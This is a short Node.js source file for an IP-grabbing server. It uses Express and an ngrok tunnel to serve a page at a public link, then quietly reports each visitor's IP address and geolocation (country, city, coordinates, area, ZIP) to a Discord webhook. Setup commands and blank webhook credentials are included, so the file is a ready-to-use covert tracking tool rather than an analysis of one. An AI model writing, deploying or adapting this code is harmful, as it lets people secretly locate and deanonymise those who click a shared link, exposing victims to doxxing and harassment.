
///constants///
const express = require('express')
const Discord = require('discord.js')
const ngrok = require('ngrok');
const app = express();
const geoip = require('geoip-lite');
/*
* SETUP TERMINAL COMMANDS
npm i geoip-lite
npm i ngrok 
npm i discord.js (optional)
npm i express
*/

///vars///
// YOUR WEBHOOK ID FOR DISCORD//
var id = ''
// YOUR WEBHOOK TOKEN FOR DISCORD//
var token = ''
var PORT = process.env.PORT || 1337;





///etc + tunnelling///
(async function() {
  const url = await ngrok.connect({proto: 'http', addr: 1337});
  console.log(url)
})();


app.set('trust proxy',true); 
app.use(express.static('public'))
  app.get('/', function (req, res) {
    const webhook2 = new Discord.WebhookClient(id, token);
    res.sendFile(__dirname + '/index.html') 
    var ip = req.ip;
    var geo = geoip.lookup(ip);
    webhook2.send(`** ${ip}** connected on Port ${PORT}\n** IP Information**\n Country: ${geo.country}\n City: ${geo.city}\n Lat/Long: ${geo.ll}\n Area: ${geo.area}\n Metro/ZIP: ${geo.metro}`)

  })
  app.get('/*', function (req, res) {
    res.sendFile(__dirname + '/index.html')
  });

  app.listen(PORT);
